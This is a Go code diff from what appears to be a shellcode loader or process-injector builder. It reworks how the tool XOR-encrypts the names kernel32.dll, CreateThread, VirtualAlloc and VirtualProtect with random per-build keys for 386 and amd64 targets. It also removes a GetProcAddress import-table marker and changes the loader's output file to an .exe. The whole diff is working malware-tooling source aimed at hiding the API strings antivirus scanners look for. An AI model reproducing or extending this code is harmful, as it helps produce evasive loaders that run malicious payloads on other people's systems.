@@ -63,7 +63,6 @@ var (
 
 var (
 	separator = []byte{0x8F, 0x17, 0x97, 0x3C} // split each instruction
-	gpaOffset = []byte{0x33, 0x22, 0x11, 0xFF} // GetProcAddress offset in IAT
 )
 
 type loaderCtx struct {
@@ -133,7 +132,7 @@ func (inj *Injector) buildLoader() ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	inj.buildProcNames(ctx)
+	inj.encryptStrings(ctx)
 	// process loader template and assemble it
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
@@ -143,7 +142,7 @@ func (inj *Injector) buildLoader() ([]byte, error) {
 	fmt.Println(buf.String())
 	inst, err := inj.assemble(buf.String())
 	inst = bytes.ReplaceAll(inst, separator, nil)
-	os.WriteFile("testdata/loader.bin", inst, 0600)
+	os.WriteFile("testdata/loader.exe", inst, 0600)
 	return inst, err
 }
 
@@ -321,18 +320,18 @@ func (inj *Injector) getProcFromIAT(proc string) *iat {
 	return nil
 }
 
-func (inj *Injector) buildProcNames(ctx *loaderCtx) {
+func (inj *Injector) encryptStrings(ctx *loaderCtx) {
 	isUTF16 := ctx.LoadLibraryWOnly
-	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.buildProcName("kernel32.dll", isUTF16)
-	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.buildProcName("CreateThread", isUTF16)
-	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.buildProcName("VirtualAlloc", isUTF16)
-	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.buildProcName("VirtualProtect", isUTF16)
+	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.encryptString("kernel32.dll", isUTF16)
+	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.encryptString("CreateThread", false)
+	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.encryptString("VirtualAlloc", false)
+	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.encryptString("VirtualProtect", false)
 }
 
-func (inj *Injector) buildProcName(name string, isUTF16 bool) ([]int64, []int64) {
-	name += "\x00"
+func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) {
+	str += "\x00"
 	if isUTF16 {
-		name = toUTF16(name)
+		str = toUTF16(str)
 	}
 	var (
 		val []int64
@@ -341,26 +340,26 @@ func (inj *Injector) buildProcName(name string, isUTF16 bool) ([]int64, []int64)
 	switch inj.arch {
 	case "386":
 		// process alignment
-		num := len(name) % 4
+		num := len(str) % 4
 		if num != 0 {
 			num = 4 - num
 		}
-		name += strings.Repeat("\x00", num)
-		for i := len(name) - 4; i >= 0; i -= 4 {
-			v := binary.LittleEndian.Uint32([]byte(name[i:]))
+		str += strings.Repeat("\x00", num)
+		for i := len(str) - 4; i >= 0; i -= 4 {
+			v := binary.LittleEndian.Uint32([]byte(str[i:]))
 			k := inj.rand.Uint32()
 			val = append(val, int64(v^k))
 			key = append(key, int64(k))
 		}
 	case "amd64":
 		// process alignment
-		num := len(name) % 8
+		num := len(str) % 8
 		if num != 0 {
 			num = 8 - num
 		}
-		name += strings.Repeat("\x00", num)
-		for i := len(name) - 8; i >= 0; i -= 8 {
-			v := int64(binary.LittleEndian.Uint64([]byte(name[i:]))) // #nosec G115
+		str += strings.Repeat("\x00", num)
+		for i := len(str) - 8; i >= 0; i -= 8 {
+			v := int64(binary.LittleEndian.Uint64([]byte(str[i:]))) // #nosec G115
 			k := inj.rand.Int63()
 			val = append(val, v^k)
 			key = append(key, k)
